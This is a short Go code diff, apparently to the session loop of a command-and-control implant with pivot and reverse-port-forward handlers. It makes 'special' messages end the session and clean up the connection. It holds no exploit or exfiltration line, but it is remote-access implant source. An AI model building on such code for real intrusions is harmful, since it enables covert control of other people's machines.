@@ -27,6 +27,7 @@ import "C"
 import (
 	"crypto/rand"
 	"encoding/binary"
+	"errors"
 
 	insecureRand "math/rand"
 	"os"
@@ -64,6 +65,7 @@ import (
 var (
 	InstanceID       string
 	connectionErrors = 0
+	ErrTerminate     = errors.New("terminate")
 )
 
 func init() {
@@ -545,6 +547,10 @@ func openSessionHandler(data []byte) {
 			connectionAttempts++
 			if connection != nil {
 				err := sessionMainLoop(connection)
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
 				if err == nil {
 					break
 				}
@@ -597,11 +603,11 @@ func sessionMainLoop(connection *transports.Connection) error {
 	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
-		if handler, ok := specialHandlers[envelope.Type]; ok {
+		if _, ok := specialHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
-			handler(envelope.Data, connection)
+			return ErrTerminate
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
